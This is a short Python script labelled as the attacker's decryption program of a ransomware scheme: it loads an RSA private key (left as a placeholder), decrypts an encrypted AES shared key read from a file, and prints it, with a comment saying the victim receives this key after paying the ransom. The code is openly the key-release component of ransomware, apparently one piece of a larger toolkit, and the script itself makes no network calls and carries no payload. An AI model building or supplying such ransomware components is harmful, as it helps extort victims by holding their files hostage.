'''
Attacker's Decryption Program
'''
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# =================================
#  PUT dec.key PRIVATE KEY HERE
# =================================
PRIVATE_KEY_DATA = b"""
-----BEGIN PRIVATE KEY-----
PUT PRIVATE KEY HERE
-----END PRIVATE KEY-----
"""

def main():
    if len(sys.argv) != 2:
        print("Usage: python AD.py EncryptedSharedKey")
        return

    enc_file = sys.argv[1]

    # Load private key
    private_key = serialization.load_pem_private_key(
        PRIVATE_KEY_DATA,
        password=None
    )

    # Read encrypted shared key
    with open(enc_file, "rb") as f:
        encrypted_shared_key = f.read()

    # Decrypt AES key
    shared_key = private_key.decrypt(
        encrypted_shared_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Print to stdout (victim receives this after ransom payment)
    print(shared_key.decode())

if __name__ == "__main__":
    main()
